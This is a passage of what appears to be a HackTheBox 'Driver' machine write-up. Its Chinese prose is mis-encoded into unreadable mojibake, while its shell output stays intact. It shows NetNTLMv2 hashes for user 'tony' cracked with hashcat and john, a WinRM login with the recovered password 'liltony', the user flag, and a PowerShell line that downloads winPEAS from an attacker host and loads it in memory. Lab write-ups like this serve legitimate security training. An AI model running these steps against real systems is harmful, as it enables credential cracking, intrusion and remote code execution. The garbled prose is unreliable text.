<p>è¿™æ˜¯<code>ntlmv2</code>çš„hashï¼Œæœºåˆ¶å†³å®šäº†å³ä½¿åŒâ¼€ä¸ªâ½¤æˆ·ï¼Œå¯†ç â¼€ç›´æ²¡å˜ï¼Œntlmv2çš„å€¼ä¹Ÿä¼šä¸åŒã€‚å› ä¸ºåœ¨NTLMv2çš„è®¤è¯è¿‡ç¨‹ä¸­ï¼Œ<strong>æœåŠ¡å™¨ä¼šâ½£æˆâ¼€ä¸ªéšæœºæ•°ä½œä¸ºæŒ‘æˆ˜ç»™å®¢æˆ·ç«¯</strong>ã€‚è¿™ä¸ª<strong>æŒ‘æˆ˜æ˜¯éšæœºçš„</strong>ï¼Œæ¯æ¬¡è®¤è¯è¯·æ±‚éƒ½ä¼šä¸åŒï¼Œå› æ­¤å³ä½¿æ˜¯ç›¸åŒçš„â½¤æˆ·å’Œå¯†ç ï¼Œå“åº”ä¹Ÿä¼šå› ä¸ºæœåŠ¡å™¨æŒ‘æˆ˜çš„ä¸åŒâ½½ä¸åŒã€‚é™¤äº†æœåŠ¡å™¨æŒ‘æˆ˜ä¹‹å¤–ï¼Œ<strong>NTLMv2åè®®è¿˜å…è®¸å®¢æˆ·ç«¯â½£æˆâ¾ƒâ¼°çš„æŒ‘æˆ˜</strong>ï¼Œè¿™åŒæ ·æ˜¯â¼€ä¸ªéšæœºæ•°ã€‚å®¢æˆ·ç«¯æŒ‘æˆ˜ä¹Ÿä¼šè¢«åŒ…å«åœ¨æœ€ç»ˆçš„å“åº”ä¸­ã€‚<strong>NTLMv2 çš„å“åº”ä¸­é€šå¸¸è¿˜ä¼šåŒ…å«â¼€ä¸ªæ—¶é—´æˆ³ï¼Œè¿™ä¸ªæ—¶é—´æˆ³æ˜¯è®¤è¯å‘â½£æ—¶çš„å…·ä½“æ—¶é—´ç‚¹</strong>ã€‚æ—¶é—´æˆ³çš„åŠ â¼Šè¿›â¼€æ­¥å¢åŠ äº†æ¯æ¬¡å“åº”çš„å”¯â¼€æ€§ã€‚æ‰€ä»¥å¦‚ä¸Šåº”è¯¥æ˜¯â¼€ä¸ªâ½¤æˆ·çš„è®¤è¯ã€‚</p>
<p><strong>è¿™ä¸ªhashæ€ä¹ˆâ½¤ï¼Œèƒ½hashä¼ é€’å—ï¼Ÿ</strong></p>
<ul>
<li>ç­”æ¡ˆæ˜¯ä¸èƒ½çš„ï¼Œå› ä¸ºè¿™ä¸ªhashçš„â½£æˆå€¼â¾¥â¾¯æœ‰<strong>éšæœºå€¼</strong>ï¼Œè¿˜æœ‰æ—¶é—´æˆ³ï¼Œä¸èƒ½åšhashé‡â½¤ï¼Œæ‰€ä»¥è¦â½¤ä¹Ÿ<strong>åªèƒ½ç ´è§£</strong>ã€‚</li>
</ul>
<hr>

<p>å…ˆè¯†åˆ«â¼€ä¸‹ntlmv2çš„æ¨¡å¼ç±»å‹</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/HackTheBox/Driver]</span><br><span class="line">â””â”€$ hashcat --<span class="built_in">help</span> | grep -i ntlm</span><br><span class="line"> 5500 | NetNTLMv1 / NetNTLMv1+ESS | Network</span><br><span class="line">Protocol</span><br><span class="line"> 27000 | NetNTLMv1 / NetNTLMv1+ESS (NT) | Network</span><br><span class="line">Protocol</span><br><span class="line"> 5600 | NetNTLMv2 | Network</span><br><span class="line">Protocol</span><br><span class="line"> 27100 | NetNTLMv2 (NT) | Network</span><br><span class="line">Protocol</span><br><span class="line"> 1000 | NTLM |</span><br><span class="line">Operating System</span><br></pre></td></tr></table></figure>

<p>ä¸éš¾åˆ¤æ–­æ˜¯5600ï¼Œä¹Ÿå¯ä»¥å€ŸåŠ©â¼¯å…·è¯†åˆ«ï¼Œæˆ‘ä»¬ç°åœ¨ä¸æ˜¯è¯†åˆ«ç±»å‹ï¼Œç±»å‹æˆ‘ä»¬å·²ç»çŸ¥é“ï¼Œresponderçš„ç»“æœå°±è¯´äº†ç±»å‹äº†ï¼Œæ˜¯æƒ³çŸ¥é“<code>hashcat</code>ç ´è§£æ—¶çš„modeã€‚æ‰€ä»¥ä¸”ä¸è¯´hash-identifierè¯†åˆ«çš„å‡†è¿˜æ˜¯ä¸å‡†ï¼ŒåŠŸèƒ½ä¸Šå°±ä¸æ»¡â¾œã€‚</p>
<p>å…¶å®è¯´èµ·æ¥hash-identifierçš„å±¡å±¡è¯†åˆ«ä¸å‡†ï¼Œæ‰€ä»¥æœ‰ä¸€ä¸ªæ›´å¥½çš„å·¥å…·æ¨èï¼š<code>nth</code>:name that hash</p>
<p>githubä»“åº“ï¼š(<a target="_blank" rel="noopener" href="https://github.com/HashPals/Name-That-Hash">https://github.com/HashPals/Name-That-Hash</a>)</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/HackTheBox/Driver]</span><br><span class="line">â””â”€<span class="variable">$nth</span> --file digest-only</span><br><span class="line">_   _                           _____ _           _          _   _           _     </span><br><span class="line"> | \ | |                         |_   _| |         | |        | | | |         | |    </span><br><span class="line"> |  \| | __ _ _ __ ___   ___ ______| | | |__   __ _| |_ ______| |_| | __ _ ___| |__  </span><br><span class="line"> | . ` |/ _` | <span class="string">&#x27;_ ` _ \ / _ \______| | | &#x27;</span>_ \ / _` | __|______|  _  |/ _` / __| <span class="string">&#x27;_ \ </span></span><br><span class="line"><span class="string"> | |\  | (_| | | | | | |  __/      | | | | | | (_| | |_       | | | | (_| \__ \ | | |</span></span><br><span class="line"><span class="string"> \_| \_/\__,_|_| |_| |_|\___|      \_/ |_| |_|\__,_|\__|      \_| |_/\__,_|___/_| |_|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">https://twitter.com/bee_sec_san</span></span><br><span class="line"><span class="string">https://github.com/HashPals/Name-That-Hash </span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">tony::DRIVER:9805a1c04bcadcbd:B23D7CAC6F424B16DA5B0B0A56608376:010100000000000000C1C8116E3CDB017864C07A9ED9F9FE0000000002000800570049003100310001001E00570049</span></span><br><span class="line"><span class="string">004E002D004D00410047004400570036004E00590058003700380004003400570049004E002D004D00410047004400570036004E0059005800370038002E0057004900310031002E004C004F00430</span></span><br><span class="line"><span class="string">041004C000300140057004900310031002E004C004F00430041004C000500140057004900310031002E004C004F00430041004C000700080000C1C8116E3CDB010600040002000000080030003000</span></span><br><span class="line"><span class="string">0000000000000000000000200000E84091EDC9060A2C78784CFED332099AC1E648A1B661A74F6722500F56FBED190A0010000000000000000000000000000000000009001E0063006900660073002</span></span><br><span class="line"><span class="string">F00310030002E00310030002E00310036002E003400000000000000000000000000</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Most Likely </span></span><br><span class="line"><span class="string">NetNTLMv2, HC: 5600 JtR: netntlmv2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">tony::DRIVER:5eee6d97b85bf7b1:D3527A19F9F7B21D0D86DCAF12F8CBDA:010100000000000000C1C8116E3CDB0187D6F7292FC2FA790000000002000800570049003100310001001E00570049</span></span><br><span class="line"><span class="string">004E002D004D00410047004400570036004E00590058003700380004003400570049004E002D004D00410047004400570036004E0059005800370038002E0057004900310031002E004C004F00430</span></span><br><span class="line"><span class="string">041004C000300140057004900310031002E004C004F00430041004C000500140057004900310031002E004C004F00430041004C000700080000C1C8116E3CDB010600040002000000080030003000</span></span><br><span class="line"><span class="string">0000000000000000000000200000E84091EDC9060A2C78784CFED332099AC1E648A1B661A74F6722500F56FBED190A0010000000000000000000000000000000000009001E0063006900660073002</span></span><br><span class="line"><span class="string">F00310030002E00310030002E00310036002E003400000000000000000000000000</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Most Likely </span></span><br><span class="line"><span class="string">NetNTLMv2, HC: 5600 JtR: netntlmv2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">tony::DRIVER:a274086f3be17782:9D5C4FED126604E4FFE741A4B60AA002:010100000000000000C1C8116E3CDB0172B29D84DB7945250000000002000800570049003100310001001E00570049</span></span><br><span class="line"><span class="string">004E002D004D00410047004400570036004E00590058003700380004003400570049004E002D004D00410047004400570036004E0059005800370038002E0057004900310031002E004C004F00430</span></span><br><span class="line"><span class="string">041004C000300140057004900310031002E004C004F00430041004C000500140057004900310031002E004C004F00430041004C000700080000C1C8116E3CDB010600040002000000080030003000</span></span><br><span class="line"><span class="string">0000000000000000000000200000E84091EDC9060A2C78784CFED332099AC1E648A1B661A74F6722500F56FBED190A0010000000000000000000000000000000000009001E0063006900660073002</span></span><br><span class="line"><span class="string">F00310030002E00310030002E00310036002E003400000000000000000000000000</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Most Likely </span></span><br><span class="line"><span class="string">NetNTLMv2, HC: 5600 JtR: netntlmv2</span></span><br></pre></td></tr></table></figure>

<p>é€šè¿‡ä¸€ç•ªäº¤å‰éªŒè¯æ²¡é”™å°±æ˜¯5600ï¼Œå¼€å§‹ç ´è§£ï¼ŒæœŸå¾…èƒ½ç ´è§£å‡ºæ¥ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/HackTheBox/Driver]</span><br><span class="line">â””â”€$ <span class="built_in">sudo</span> hashcat -m 5600 digest-only /usr/share/wordlists/rockyou.txt </span><br><span class="line">hashcat (v6.2.6) starting</span><br><span class="line">OpenCL API (OpenCL 3.0 PoCL 5.0+debian Linux, None+Asserts, RELOC, SPIR, LLVM</span><br><span class="line">16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform <span class="comment">#1 [The pocl project]</span></span><br><span class="line">==============================================================================</span><br><span class="line">====================================================================</span><br><span class="line">* Device <span class="comment">#1: cpu-haswell-Intel(R) Core(TM) i9-9980HK CPU @ 2.40GHz, 2901/5866</span></span><br><span class="line">MB (1024 MB allocatable), 6MCU</span><br><span class="line">Minimum password length supported by kernel: 0</span><br><span class="line">Maximum password length supported by kernel: 256</span><br><span class="line">Hashes: 13 digests; 13 unique digests, 13 unique salts</span><br><span class="line">Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates</span><br><span class="line">Rules: 1</span><br><span class="line">Optimizers applied:</span><br><span class="line">* Zero-Byte</span><br><span class="line">* Not-Iterated</span><br><span class="line">ATTENTION! Pure (unoptimized) backend kernels selected.</span><br><span class="line">Pure kernels can crack longer passwords, but drastically reduce performance.</span><br><span class="line">If you want to switch to optimized kernels, append -O to your commandline.</span><br><span class="line">See the above message to find out about the exact limits.</span><br><span class="line">Watchdog: Temperature abort trigger <span class="built_in">set</span> to 90c</span><br><span class="line">Host memory required <span class="keyword">for</span> this attack: 1 MB</span><br><span class="line">Dictionary cache hit:</span><br><span class="line">* Filename..: /usr/share/wordlists/rockyou.txt</span><br><span class="line">* Passwords.: 14344385</span><br><span class="line">* Bytes.....: 139921507</span><br><span class="line">* Keyspace..: 14344385</span><br><span class="line">TONY::DRIVER:f3b3193dcd56559c:2c56932f901f3e22b131998179c8ff0b:010100000000000000b9e32944a5da01a594e191ec8f658e0000000002000800530046004e00570001001e00570049004e002d00420038003700450052005600380047004f005500450004003400570049004e002d00420038003700450052005600380047004f00550045002e00530046004e0057002e004c004f00430041004c0003001400530046004e0057002e004c004f00430041004c0005001400530046004e0057002e004c004f00430041004c000700080000b9e32944a5da01060004000200000008003000300000000000000000000000002000003754e27c9803f40a182b2657eb8193aa5eb370597b636d83ae5ab2ce59e879ca0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e003900000000000000000000000000:liltony</span><br><span class="line">TONY::DRIVER:49820e408dbb146c:fbd317352b55da9cd0162104258561a6:010100000000000000b9e32944a5da01ba9bbd100e206bc50000000002000800530046004e00570001001e00570049004e002d00420038003700450052005600380047004f005500450004003400570049004e002d00420038003700450052005600380047004f00550045002e00530046004e0057002e004c004f00430041004c0003001400530046004e0057002e004c004f00430041004c0005001400530046004e0057002e004c004f00430041004c000700080000b9e32944a5da01060004000200000008003000300000000000000000000000002000003754e27c9803f40a182b2657eb8193aa5eb370597b636d83ae5ab2ce59e879ca0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e003900000000000000000000000000:liltony</span><br><span class="line">TONY::DRIVER:12430e8b200482bf:87e6078fdc62c2034ca53a176e141648:010100000000000000b9e32944a5da01526894628d5aa73e0000000002000800530046004e00570001001e00570049004e002d00420038003700450052005600380047004f005500450004003400570049004e002d00420038003700450052005600380047004f00550045002e00530046004e0057002e004c004f00430041004c0003001400530046004e0057002e004c004f00430041004c0005001400530046004e0057002e004c004f00430041004c000700080000b9e32944a5da01060004000200000008003000300000000000000000000000002000003754e27c9803f40a182b2657eb8193aa5eb370597b636d83ae5ab2ce59e879ca0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e003900000000000000000000000000:liltony</span><br><span class="line"></span><br><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Cracked</span><br><span class="line">Hash.Mode........: 5600 (NetNTLMv2)</span><br><span class="line">Hash.Target......: digest-only</span><br><span class="line">Time.Started.....: Mon May 13 15:52:45 2024 (0 secs)</span><br><span class="line">Time.Estimated...: Mon May 13 15:52:45 2024 (0 secs)</span><br><span class="line">Kernel.Feature...: Pure Kernel</span><br><span class="line">Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)</span><br><span class="line">Guess.Queue......: 1/1 (100.00%)</span><br><span class="line">Speed.#1.........: 2558.4 kH/s (0.95ms) @ Accel:512 Loops:1 Thr:1 Vec:8</span><br><span class="line">Recovered........: 13/13 (100.00%) Digests (total), 13/13 (100.00%) Digests</span><br><span class="line">(new), 13/13 (100.00%) Salts</span><br><span class="line">Progress.........: 439296/186477005 (0.24%)</span><br><span class="line">Rejected.........: 0/439296 (0.00%)</span><br><span class="line">Restore.Point....: 30720/14344385 (0.21%)</span><br><span class="line">Restore.Sub.#1...: Salt:12 Amplifier:0-1 Iteration:0-1</span><br><span class="line">Candidate.Engine.: Device Generator</span><br><span class="line">Candidates.#1....: !!!!!! -&gt; redlips</span><br><span class="line">Hardware.Mon.#1..: Util: 30%</span><br><span class="line">Started: Mon May 13 15:52:44 2024</span><br><span class="line">Stopped: Mon May 13 15:52:47 2024</span><br></pre></td></tr></table></figure>

<p>å¾ˆå¿«ç ´è§£å‡ºæ¥ <code>tony:liltony </code>è¿™ç»„å‡­æ®ã€‚å…¶å®â½¤<code>john</code>ä¹Ÿæ˜¯å¯ä»¥çš„</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> john digest-only --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt --pot=driver.pot</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œåé¢è®°å¾—åŠ ä¸Š<code>--pot=driver.pot</code>ç±»ä¼¼äºç”Ÿæˆä¸€ä¸ªæ—¥å¿—ï¼Œåç»­å¤šæ¬¡çˆ†ç ´å¦‚æœçˆ†ç ´æˆåŠŸä»–æ˜¯ä¸æ˜¾ç¤ºçš„ï¼Œä½†åŠ ä¸Šè¿™ä¸ªæ— è®ºæœ‰æ— ç¼“å­˜åéƒ½ä¼šæ‰“å°å‡ºæ¥ã€‚</p>
<h4 id="å»ºç«‹ç³»ç»Ÿç«‹è¶³ç‚¹ï¼štonyçš„shell"><a href="#å»ºç«‹ç³»ç»Ÿç«‹è¶³ç‚¹ï¼štonyçš„shell" class="headerlink" title="å»ºç«‹ç³»ç»Ÿç«‹è¶³ç‚¹ï¼štonyçš„shell"></a>å»ºç«‹ç³»ç»Ÿç«‹è¶³ç‚¹ï¼štonyçš„shell</h4><p>å…ˆâ½¤netexec æµ‹è¯•â¼€ä¸‹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/HackTheBox/Driver]</span><br><span class="line">â””â”€$ <span class="built_in">sudo</span> nxc winrm driver.htb -u tony -p liltony</span><br><span class="line">WINRM 10.129.40.36 5985 DRIVER [*] Windows 10.0 Build 10240 (name:DRIVER) (domain:DRIVER)</span><br><span class="line">WINRM 10.129.40.36 5985 DRIVER [+] DRIVER\tony:liltony (Pwn3d!)</span><br></pre></td></tr></table></figure>

<img src="/posts/23837ad8/1732295872478.png" class="" width="1732295872478">

<p>wow! ç›´æ¥pwnedï¼ç™»å½•ä¸Šå»ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/HackTheBox/Driver]</span><br><span class="line">â””â”€$ <span class="built_in">sudo</span> evil-winrm -i driver.htb -u tony -p liltony</span><br><span class="line">Evil-WinRM shell v3.5 </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation:</span><br><span class="line">quoting_detection_proc() <span class="keyword">function</span> is unimplemented on this machine</span><br><span class="line">Data: For more information, check Evil-WinRM GitHub:</span><br><span class="line">https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br><span class="line"></span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\tony\Documents&gt; <span class="built_in">whoami</span></span><br><span class="line">driver\tony</span><br><span class="line">*Evil-WinRM* PS C:\Users\tony\Documents&gt; hostname</span><br><span class="line">DRIVER</span><br><span class="line">*Evil-WinRM* PS C:\Users\tony\Documents&gt; ipconfig</span><br><span class="line">Windows IP Configuration</span><br><span class="line">Ethernet adapter Ethernet0:</span><br><span class="line"> Connection-specific DNS Suffix . : .htb</span><br><span class="line"> IPv6 Address. . . . . . . . . . . : dead:beef::be</span><br><span class="line"> IPv6 Address. . . . . . . . . . . : dead:beef::c9c2:bfe:78b2:d9aa</span><br><span class="line"> Temporary IPv6 Address. . . . . . : dead:beef::35c0:d063:86f2:571f</span><br><span class="line"> Link-<span class="built_in">local</span> IPv6 Address . . . . . : fe80::c9c2:bfe:78b2:d9aa%5</span><br><span class="line"> IPv4 Address. . . . . . . . . . . : 10.129.40.36</span><br><span class="line"> Subnet Mask . . . . . . . . . . . : 255.255.0.0</span><br><span class="line"> Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:acf1%5</span><br><span class="line"> 10.129.0.1</span><br><span class="line">Tunnel adapter isatap..htb:</span><br><span class="line"> Media State . . . . . . . . . . . : Media disconnected</span><br><span class="line"> Connection-specific DNS Suffix . : .htb</span><br></pre></td></tr></table></figure>

<p>è™½ç„¶æ˜¯pwnedï¼Œä½†æ˜¯è¿˜ä¸åˆ°ç³»ç»Ÿç®¡ç†å‘˜æƒé™ã€‚çœ‹åˆ°æœ‰user.txtï¼Œæ‹¿ä¸‹æ¥ï¼š</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\tony\Documents&gt; <span class="built_in">gc</span> C:\users\tony\Desktop\user.txt</span><br><span class="line"><span class="number">55</span>f978defaced401d0021f365553d7b7</span><br></pre></td></tr></table></figure>

<h4 id="ææƒæšä¸¾"><a href="#ææƒæšä¸¾" class="headerlink" title="ææƒæšä¸¾"></a>ææƒæšä¸¾</h4><p>ææƒæœ€å…ˆè¦çœ‹çš„æ˜¯webçš„é…ç½®â½‚ä»¶ï¼Œå…ˆå®šä½webâ½¬å½•ï¼Œâ¼€èˆ¬æ˜¯åœ¨cç›˜çš„inetpubä¸‹ï¼Œå»æœâ¾¸â»šçš„å›¾â½šï¼Œå°±å¯ä»¥å®šä½åˆ°ã€‚</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">powershellå‘½ä»¤ï¼š</span><br><span class="line"><span class="built_in">Get-ChildItem</span> <span class="literal">-Path</span> C:\ <span class="literal">-Filter</span> ricoh.png <span class="literal">-Recurse</span> <span class="literal">-ErrorAction</span> SilentlyContinue</span><br><span class="line"></span><br><span class="line">å‘½ä»¤å¯ä»¥ç®€å†™æˆï¼š</span><br><span class="line"><span class="built_in">gci</span> C:\ ricoh.png <span class="literal">-Recurse</span> <span class="literal">-ErrorAction</span> SilentlyContinue</span><br></pre></td></tr></table></figure>

<p>ç„¶åæŸ¥çœ‹æºç ï¼š</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\inetpub\wwwroot&gt; <span class="built_in">gc</span> fw_up.php</span><br></pre></td></tr></table></figure>

<p>ç®€å•ç¿»æ‰¾ä¹‹åï¼Œæ²¡æœ‰ä»€ä¹ˆæ”¶è·ï¼Œå†³å®šâ½¤<code>winpeas</code>è¿›â¾â¾ƒåŠ¨åŒ–æšä¸¾ã€‚åœ¨å®˜â½…githubåº“Releaseâ»šä¸‹è½½åº”â½¤ã€‚</p>
<p><code>https://github.com/peass-ng/PEASS-ng/releases/tag/20240512-3398870e</code></p>
<p>ä¸‹è½½åä¿å­˜åœ¨kaliçš„â¼¯ä½œè·¯å¾„ä¸‹ï¼Œå¹¶é€šè¿‡ç®€æ˜“webæœåŠ¡æä¾›ä¸‹è½½â½€æŒã€‚æœ€ä½³å®è·µçš„æ•™ç¨‹â»…è¿™ä¸ªé“¾æ¥ï¼Œå½“ç„¶ä¹Ÿæ˜¯å®˜â½…æ•™ç¨‹ä¸»â»šï¼š</p>
<p><code>https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe</code></p>
<img src="/posts/23837ad8/1732296400008.png" class="" width="1732296400008">

<p>å½¢æˆå¦‚ä¸‹ä¸¤æ¡å¾…æ‰§â¾çš„å‘½ä»¤ï¼Œä»¥ä¾¿ä»¥åå°„çš„â½…å¼åœ¨å†…å­˜ä¸­æ‰§â¾â½†â½‚ä»¶æœ¬åœ°ææƒæšä¸¾:</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-ExecutionPolicy</span> Unrestricted <span class="literal">-Scope</span> CurrentUser</span><br><span class="line"></span><br><span class="line"><span class="variable">$wp</span>=[<span class="type">System.Reflection.Assembly</span>]::Load([<span class="built_in">byte</span>[]](<span class="built_in">Invoke-WebRequest</span> <span class="string">&quot;http://10.10.16.2:8888/winPEASx64_ofs.exe&quot;</span> <span class="literal">-UseBasicParsing</span> | <span class="built_in">Select-Object</span> <span class="literal">-ExpandProperty</span> Content)); [<span class="type">winPEAS.Program</span>]::Main(<span class="string">&quot;log&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯æ²¡æœ‰æ­£å¸¸æ‰§â¾ï¼šå¯ä»¥åœ¨æœ¬åœ°åšå®éªŒä¸æ¼”ç¤ºã€‚</p>
<p>è¿™å¯èƒ½ä¸å½“å‰ä¼šè¯çš„uacç­–ç•¥ç­‰æœ‰å…³ï¼Œâ½†è®ºå¦‚ä½•ä¸èƒ½â½†â½‚ä»¶æ‰§â¾ï¼Œé‚£åªèƒ½å†’é™©æœ¬åœ°æ‰§â¾äº†ã€‚</p>
<p>å»ºè®®åœ¨å…¬å…±â½¬å½•å»ºâ½´â¼¯ä½œâ½‚ä»¶å¤¹æ“ä½œï¼Œæˆ‘æ˜¯å»ºâ½´äº†appsâ½‚ä»¶å¤¹ï¼Œä»¥è·å¾—æ¸…æ™°çš„æ“ä½œåœºæ™¯ï¼š</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\tony\Documents&gt; <span class="built_in">cd</span> c:\programdata\;mkdir apps;<span class="built_in">cd</span> apps</span><br></pre></td></tr></table></figure>

<p>æ‰§â¾â¼€ä¸‹ï¼Œè€ƒè™‘æ‰§â¾â½‡å¿—å¯èƒ½åâ»“ï¼Œå®¹æ˜“è¶…è¿‡ç»ˆç«¯ç¼“å†²åŒºâ¼¤â¼©ï¼ŒæŒ‰ç…§Winpeasçš„å¸®åŠ©å»ºè®®ï¼Œæˆ‘ä»¬æŒ‡å®šlogå‚æ•°ã€‚</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\programdata\apps&gt; .\winPEASx64_ofs.exe log</span><br></pre></td></tr></table></figure>

<p>ä¿å­˜åˆ°æ—¥å¿—æ–‡ä»¶ä¸­ï¼Œç„¶ådownloadåˆ°æœ¬åœ°ã€‚</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\programdata\apps&gt; download out.txt</span><br><span class="line">Info: Downloading C:\programdata\apps\out.txt to out.txt</span><br><span class="line">Info: Download successful!</span><br></pre></td></tr></table></figure>

<p>ç„¶åâ½¤ <code>cat out.txt | less -R</code> ä»¥è·å¾—ç€â¾Šçš„ã€äº¤äº’å¥½çš„æµè§ˆç•Œâ¾¯ã€‚ä¹Ÿå¯ä»¥ç”¨<code>batcat</code>æŸ¥çœ‹ï¼Œä½¿ç”¨<code>apt install bat</code>ä¸‹è½½</p>
<p>å¥½çš„ï¼Œé€â¼€åˆ†æå§ï¼<strong>é‡ç‚¹çœ‹çº¢â¾Šçš„å†…å®¹</strong>ã€‚ä¸€å®šè¦å¤šçœ‹ï¼ï¼ï¼ï¼</p>
